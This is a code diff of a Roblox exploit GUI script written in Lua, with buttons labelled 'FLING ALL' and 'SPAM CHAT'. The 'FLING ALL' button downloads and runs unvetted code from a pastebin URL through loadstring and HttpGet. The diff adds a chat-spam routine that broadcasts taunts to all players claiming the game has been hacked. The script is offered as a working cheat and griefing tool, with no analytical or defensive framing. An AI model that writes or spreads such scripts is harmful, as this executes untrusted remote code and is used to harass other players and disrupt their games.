@@ -7,6 +7,7 @@ local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local FLINGALL = Instance.new("TextButton")
+local SpamCHAT = Instance.new("TextButton")
  
 --Properties:
  
@@ -15,14 +16,14 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = game.CoreGui
  
 Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.new(1, 0, 0)
+Frame.BackgroundColor3 = Color3.new(13, 105, 172)
 Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Frame.BorderSizePixel = 3
-Frame.Position = UDim2.new(0.536656916, 0, 0.220883533, 0)
+Frame.Position = UDim2.new(0.536656916, 0, 0.220883010, 0)
 Frame.Size = UDim2.new(0, 282, 0, 226)
 
 TextLabel.Parent = Frame
-TextLabel.BackgroundColor3 = Color3.fromRGB(174, 167, 255)
+TextLabel.BackgroundColor3 = Color3.fromRGB(229, 228, 223)
 TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.BorderSizePixel = 3
 TextLabel.Position = UDim2.new(0, 0, 0.889380515, 0)
@@ -35,62 +36,100 @@ TextLabel.TextSize = 14.000
 TextLabel.TextWrapped = true
 
 FLINGALL.Parent = Frame
-FLINGALL.BackgroundColor3 = Color3.fromRGB(174, 167, 255)
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 3
-TextLabel.Position = UDim2.new(0, 0, 1, 0)
-TextLabel.Size = UDim2.new(0, 282, 0, 25)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "FLING ALL"
-TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
-TextLabel.TextWrapped = true
-TextLabel.MouseButton1Down:connect(function()
+FLINGALL.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
+FLINGALL.BorderColor3 = Color3.fromRGB(0, 0, 0)
+FLINGALL.BorderSizePixel = 3
+FLINGALL.Position = UDim2.new(1, 0, 0, 0)
+FLINGALL.Size = UDim2.new(0, 100, 0, 25)
+FLINGALL.Font = Enum.Font.SourceSans
+FLINGALL.Text = "FLING ALL"
+FLINGALL.TextColor3 = Color3.fromRGB(0, 0, 0)
+FLINGALL.TextScaled = true
+FLINGALL.TextSize = 14.000
+FLINGALL.TextWrapped = true
+FLINGALL.MouseButton1Down:connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 end)
+SpamCHAT.Parent = Frame
+SpamCHAT.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
+SpamCHAT.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SpamCHAT.BorderSizePixel = 3
+SpamCHAT.Position = UDim2.new(1, 0, 0.2, 0)
+SpamCHAT.Size = UDim2.new(0, 100, 0, 25)
+SpamCHAT.Font = Enum.Font.SourceSans
+SpamCHAT.Text = "SPAM CHAT"
+SpamCHAT.TextColor3 = Color3.fromRGB(0, 0, 0)
+SpamCHAT.TextScaled = true
+SpamCHAT.TextSize = 14.000
+SpamCHAT.TextWrapped = true
+SpamCHAT.MouseButton1Down:connect(function()
+local A_1 = "😡TEAM BOSSJKLO AND JUPAL HAS HACKED YOUR GAME 😡"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait(2)
+local A_1 = "😡HAHAH!?!?1😡"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait(1.5)
+local A_1 = "😡WE WILL BE ROBLOX FOR A LONG T1ME!!111😡"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait(2)
+local A_1 = "😡HAHAHA YOU'VE BEEN TROLLED LOL!!111😡"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait(1.5)
+local A_1 = "😡SO FUNNI GUYS!!111😡"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+end)
 
-local function XPCO_fake_script() -- Frame.Dragify 
+-- Scripts:
+
+local function QFCS_fake_script() -- Frame.Dragify 
 	local script = Instance.new('LocalScript', Frame)
- 
-	local UserInputService = game:GetService("UserInputService")
- 
-	local gui = script.Parent
- 
-	local dragging
-	local dragInput
-	local dragStart
-	local startPos
- 
-	local function update(input)
-		local delta = input.Position - dragStart
-		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
 	end
- 
-	gui.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = gui.Position
- 
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
- 
-	gui.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			dragInput = input
-		end
-	end)
- 
-	UserInputService.InputChanged:Connect(function(input)
-		if input == dragInput and dragging then
-			update(input)
-		end
-	end)
+	
+	dragify(script.Parent)
 end
-coroutine.wrap(XPCO_fake_script)()
+coroutine.wrap(QFCS_fake_script)()
